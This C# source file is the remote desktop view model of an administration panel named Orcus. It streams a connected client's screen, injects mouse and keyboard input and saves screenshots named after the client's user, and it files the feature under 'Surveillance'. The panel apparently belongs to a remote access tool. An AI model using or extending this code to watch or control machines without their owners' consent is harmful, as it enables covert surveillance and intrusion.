using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Threading;
using Microsoft.Win32;
using Orcus.Administration.Commands.ConnectionInitializer;
using Orcus.Administration.Commands.RemoteDesktop;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.RemoteDesktop;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Shared.Commands.ConnectionInitializer;
using Orcus.Shared.Commands.RemoteDesktop;
using Orcus.Shared.Utilities;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(16)]
    public class RemoteDesktopViewModel : CommandView
    {
        private CaptureType _availableCaptureTypes;
        private ConnectionType _availableConnectionTypes;
        private RelayCommand _closeConnectionCommand;
        private ConnectionInitializerCommand _connectionInitializerCommand;
        private Point _currentCursorScreenPoint;
        private int _currentFps;
        private DispatcherTimer _fpsUpdateTimer;
        private ImageCompressionType _imageCompressionType = ImageCompressionType.TurboJpg;
        private int _imageQuality = 80;
        private RelayCommand _initializeRemoteDesktopCommand;
        private bool _isCoreInformationAvailable;
        private bool _isInitialized;
        private bool _isKeyboardInputEnabled;
        private bool _isMouseEventEnabled;
        private bool _isMouseMovementEnabled;
        private Point _lastCursorScreenPoin;
        private DispatcherTimer _mouseMoveTimer;
        private RelayCommand _openOptionsCommand;
        private RemoteDesktopCommandLocal _remoteDesktopCommand;
        private RelayCommand _saveCurrentFrameAsCommand;
        private RelayCommand _saveCurrentFrameCommand;
        private List<ScreenInfo> _screens;
        private CaptureType _selectedCaptureType;
        private ConnectionType _selectedConnectionType;
        private ScreenInfo _selectedScreen;
        private bool _showCursor;
        private WriteableBitmap _writeableBitmap;

        public override string Name { get; } = (string) Application.Current.Resources["RemoteDesktop"];
        public override Category Category { get; } = Category.Surveillance;

        public bool IsInitialized
        {
            get { return _isInitialized; }
            set { SetProperty(value, ref _isInitialized); }
        }

        public CaptureType AvailableCaptureTypes
        {
            get { return _availableCaptureTypes; }
            set { SetProperty(value, ref _availableCaptureTypes); }
        }

        public CaptureType SelectedCaptureType
        {
            get { return _selectedCaptureType; }
            set { SetProperty(value, ref _selectedCaptureType); }
        }

        public ConnectionType AvailableConnectionTypes
        {
            get { return _availableConnectionTypes; }
            set { SetProperty(value, ref _availableConnectionTypes); }
        }

        public ConnectionType SelectedConnectionType
        {
            get { return _selectedConnectionType; }
            set { SetProperty(value, ref _selectedConnectionType); }
        }

        public ImageCompressionType ImageCompressionType
        {
            get { return _imageCompressionType; }
            set { SetProperty(value, ref _imageCompressionType); }
        }

        public List<ScreenInfo> Screens
        {
            get { return _screens; }
            set { SetProperty(value, ref _screens); }
        }

        public ScreenInfo SelectedScreen
        {
            get { return _selectedScreen; }
            set
            {
                if (SetProperty(value, ref _selectedScreen) && value != null)
                    _remoteDesktopCommand.CurrentScreen = value;
            }
        }

        public WriteableBitmap WriteableBitmap
        {
            get { return _writeableBitmap; }
            set { SetProperty(value, ref _writeableBitmap); }
        }

        public int ImageQuality
        {
            get { return _imageQuality; }
            set
            {
                if (SetProperty(value, ref _imageQuality))
                    _remoteDesktopCommand.ImageQuality = value;
            }
        }

        public bool IsCoreInformationAvailable
        {
            get { return _isCoreInformationAvailable; }
            set { SetProperty(value, ref _isCoreInformationAvailable); }
        }

        public int CurrentFps
        {
            get { return _currentFps; }
            set { SetProperty(value, ref _currentFps); }
        }

        public bool IsMouseEventEnabled
        {
            get { return _isMouseEventEnabled; }
            set { SetProperty(value, ref _isMouseEventEnabled); }
        }

        public bool IsMouseMovementEnabled
        {
            get { return _isMouseMovementEnabled; }
            set
            {
                if (SetProperty(value, ref _isMouseMovementEnabled))
                {
                    if (value)
                        IsMouseEventEnabled = true;
                    _mouseMoveTimer.IsEnabled = value;
                }
            }
        }

        public bool IsKeyboardInputEnabled
        {
            get { return _isKeyboardInputEnabled; }
            set { SetProperty(value, ref _isKeyboardInputEnabled); }
        }

        public bool ShowCursor
        {
            get { return _showCursor; }
            set
            {
                if (SetProperty(value, ref _showCursor))
                    _remoteDesktopCommand.ShowCursor = value;
            }
        }

        public bool IsStreaming => _remoteDesktopCommand.IsStreaming;

        public RelayCommand OpenOptionsCommand
        {
            get
            {
                return _openOptionsCommand ??
                       (_openOptionsCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService,
                                       new OptionsViewModel(this));
                               }));
            }
        }

        public RelayCommand InitializeRemoteDesktopCommand
        {
            get
            {
                return _initializeRemoteDesktopCommand ??
                       (_initializeRemoteDesktopCommand = new RelayCommand(async parameter =>
                       {
                           var availableConnectionTypes =
                               new Stack<ConnectionType>(Enum.GetValues(typeof(ConnectionType))
                                   .Cast<ConnectionType>()
                                   .Where(x => SelectedConnectionType != x && (AvailableConnectionTypes & x) == x)
                                   .OrderBy(x => x));
                           availableConnectionTypes.Push(SelectedConnectionType);

                           var connection = default(InitializedConnection);

                           while (availableConnectionTypes.Count > 0)
                           {
                               switch (availableConnectionTypes.Pop())
                               {
                                   case ConnectionType.TcpLan:
                                       try
                                       {
                                           connection = await
                                               _connectionInitializerCommand.InitializeTcpLanConnection();
                                       }
                                       catch (Exception)
                                       {
                                           continue;
                                       }
                                       break;
                                   case ConnectionType.Server:
                                       //server connection is the default
                                       connection = InitializedConnection.Failed;
                                       break;
                                   default:
                                       throw new ArgumentOutOfRangeException();
                               }
                               
                               break;
                           }

                           if (!connection.Succeed)
                               await _remoteDesktopCommand.InitializeRemoteDesktopDirect(SelectedCaptureType,
                                   ImageCompressionType);
                           else
                               await _remoteDesktopCommand.InitializeRemoteDesktop(connection,
                                   SelectedCaptureType, ImageCompressionType);

                           _fpsUpdateTimer.Start();
                           _remoteDesktopCommand.Start();
                       }));
            }
        }

        public RelayCommand CloseConnectionCommand
        {
            get
            {
                return _closeConnectionCommand ?? (_closeConnectionCommand = new RelayCommand(parameter =>
                {
                    _remoteDesktopCommand.Stop();
                    IsInitialized = false;
                    WriteableBitmap = null;
                }));
            }
        }

        public RelayCommand SaveCurrentFrameCommand
        {
            get
            {
                return _saveCurrentFrameCommand ?? (_saveCurrentFrameCommand = new RelayCommand(async parameter =>
                {
                    Directory.CreateDirectory("screenshots");
                    var filename = FileExtensions.MakeUnique(Path.Combine("screenshots",
                        ClientController.Client.UserName + "-" + DateTime.Now.ToString("yyyy'-'MM'-'dd'T'HH'-'mm'-'ss") +
                        ".jpg"));

                    using (var fileStream = new FileStream(filename, FileMode.CreateNew, FileAccess.Write))
                    {
                        var encoder = new JpegBitmapEncoder();
                        encoder.Frames.Add(await _remoteDesktopCommand.GetBitmapFrame());
                        encoder.Save(fileStream);
                    }
                }));
            }
        }

        public RelayCommand SaveCurrentFrameAsCommand
        {
            get
            {
                return _saveCurrentFrameAsCommand ?? (_saveCurrentFrameAsCommand = new RelayCommand(async parameter =>
                {
                    //Cache current frame
                    var writeableBitmap = await _remoteDesktopCommand.GetWriteableBitmapClone();

                    var sfd = new SaveFileDialog
                    {
                        Filter = "PNG|*.png|GIF|*.gif|BMP|*.bmp|JPEG|*.jpg;*.jpeg",
                        AddExtension = true
                    };

                    if (sfd.ShowDialog() == true)
                    {
                        using (var fileStream = new FileStream(sfd.FileName, FileMode.Create))
                        {
                            BitmapEncoder encoder;
                            switch (sfd.FilterIndex)
                            {
                                case 1:
                                    encoder = new PngBitmapEncoder();
                                    break;
                                case 2:
                                    encoder = new GifBitmapEncoder();
                                    break;
                                case 3:
                                    encoder = new BmpBitmapEncoder();
                                    break;
                                case 4:
                                    encoder = new JpegBitmapEncoder();
                                    break;
                                default:
                                    WindowService.ShowMessageBox(
                                        (string) Application.Current.Resources["FormatNotFound"],
                                        (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                                        MessageBoxImage.Error);
                                    return;
                            }

                            encoder.Frames.Add(BitmapFrame.Create(writeableBitmap));
                            encoder.Save(fileStream);
                        }
                    }
                }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _remoteDesktopCommand = clientController.Commander.GetCommand<RemoteDesktopCommandLocal>();
            _remoteDesktopCommand.RemoteDesktopInformationReceived +=
                RemoteDesktopCommandOnRemoteDesktopInformationReceived;
            _remoteDesktopCommand.Initialized += RemoteDesktopCommandOnInitialized;
            _remoteDesktopCommand.UpdateWriteableBitmap += RemoteDesktopCommandOnUpdateWriteableBitmap;

            _connectionInitializerCommand = clientController.Commander.GetCommand<ConnectionInitializerCommand>();
        }

        private void RemoteDesktopCommandOnUpdateWriteableBitmap(object sender, EventArgs eventArgs)
        {
            WriteableBitmap = _remoteDesktopCommand.WriteableBitmap;
        }

        private void RemoteDesktopCommandOnInitialized(object sender, EventArgs eventArgs)
        {
            IsInitialized = true;
        }

        private async void RemoteDesktopCommandOnRemoteDesktopInformationReceived(object sender,
            RemoteDesktopInformation remoteDesktopInformation)
        {
            AvailableCaptureTypes = remoteDesktopInformation.AvailableCaptureTypes;
            if ((_availableCaptureTypes & CaptureType.DesktopDuplication) == CaptureType.DesktopDuplication)
                SelectedCaptureType = CaptureType.DesktopDuplication;
            else if ((_availableCaptureTypes & CaptureType.FrontBuffer) == CaptureType.FrontBuffer)
                SelectedCaptureType = CaptureType.FrontBuffer;
            else
                SelectedCaptureType = CaptureType.GDI;


            AvailableConnectionTypes = ConnectionType.Server;

            if (await _connectionInitializerCommand.CheckLanConnectionAvailable())
                AvailableConnectionTypes |= ConnectionType.TcpLan;

            if ((_availableConnectionTypes & ConnectionType.TcpLan) == ConnectionType.TcpLan)
                SelectedConnectionType = ConnectionType.TcpLan;
            else
                SelectedConnectionType = ConnectionType.Server;

            Screens = remoteDesktopInformation.Screens;
            SelectedScreen = remoteDesktopInformation.Screens[0];
            IsCoreInformationAvailable = true;
        }

        public void DesktopImageOnMouseDown(MouseButtonEventArgs e, Size imageSize, Point cursorPosition)
        {
            if (!IsMouseEventEnabled || !IsStreaming)
                return;

            int x;
            int y;
            CalculateCursorPosition(cursorPosition, imageSize, out x, out y);
            _remoteDesktopCommand.MouseDown(x, y, e.ChangedButton);
        }

        public void DesktopImageOnMouseUp(MouseButtonEventArgs e, Size imageSize, Point cursorPosition)
        {
            if (!IsMouseEventEnabled || !IsStreaming)
                return;

            int x;
            int y;
            CalculateCursorPosition(cursorPosition, imageSize, out x, out y);
            _remoteDesktopCommand.MouseUp(x, y, e.ChangedButton);
        }

        public void DesktopImageOnMouseWheel(MouseWheelEventArgs e, Size imageSize, Point cursorPosition)
        {
            if (!IsMouseEventEnabled || !IsStreaming)
                return;

            int x;
            int y;
            CalculateCursorPosition(cursorPosition, imageSize, out x, out y);
            _remoteDesktopCommand.MouseWheel(x, y, e.Delta);
        }

        public void DesktopImageOnMouseMove(Size imageSize, Point cursorPosition)
        {
            if (!IsMouseMovementEnabled || !IsStreaming)
                return;

            int x;
            int y;
            CalculateCursorPosition(cursorPosition, imageSize, out x, out y);

            _currentCursorScreenPoint = new Point(x, y);
        }

        public void DesktopImageOnKeyDown(KeyEventArgs e)
        {
            if (!IsKeyboardInputEnabled || !IsStreaming)
                return;

            _remoteDesktopCommand.KeyDown(KeyInterop.VirtualKeyFromKey(e.Key));
        }

        public void DesktopImageOnKeyUp(KeyEventArgs e)
        {
            if (!IsKeyboardInputEnabled || !IsStreaming)
                return;

            _remoteDesktopCommand.KeyUp(KeyInterop.VirtualKeyFromKey(e.Key));
        }

        private void CalculateCursorPosition(Point cursorPositionOnImage, Size imageSize, out int x, out int y)
        {
            x = (int) (cursorPositionOnImage.X / imageSize.Width * WriteableBitmap.Width);
            y = (int) (cursorPositionOnImage.Y / imageSize.Height * WriteableBitmap.Height);
        }

        protected override ImageSource GetIconImageSource()
        {
            return
                new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/RemoteDesktop.ico",
                    UriKind.Absolute));
        }

        public override void Dispose()
        {
            base.Dispose();
            _fpsUpdateTimer?.Stop();
        }

        public override async void LoadView(bool loadData)
        {
            _fpsUpdateTimer = new DispatcherTimer {Interval = TimeSpan.FromSeconds(1)};
            _fpsUpdateTimer.Tick += FpsUpdateTimerOnTick;

            _mouseMoveTimer = new DispatcherTimer {Interval = TimeSpan.FromMilliseconds(200)};
            _mouseMoveTimer.Tick += MouseMoveTimerOnTick;

            await _connectionInitializerCommand.Initialize(ConnectionProtocol.Tcp);
            _remoteDesktopCommand.GetRemoteDesktopInformation();
        }

        private void MouseMoveTimerOnTick(object sender, EventArgs eventArgs)
        {
            if (_currentCursorScreenPoint != _lastCursorScreenPoin)
            {
                _remoteDesktopCommand.MouseMove((int) _currentCursorScreenPoint.X, (int) _currentCursorScreenPoint.Y);
                _lastCursorScreenPoin = _currentCursorScreenPoint;
            }
        }

        private void FpsUpdateTimerOnTick(object sender, EventArgs eventArgs)
        {
            CurrentFps = _remoteDesktopCommand.FramesPerSecond;
        }
    }
}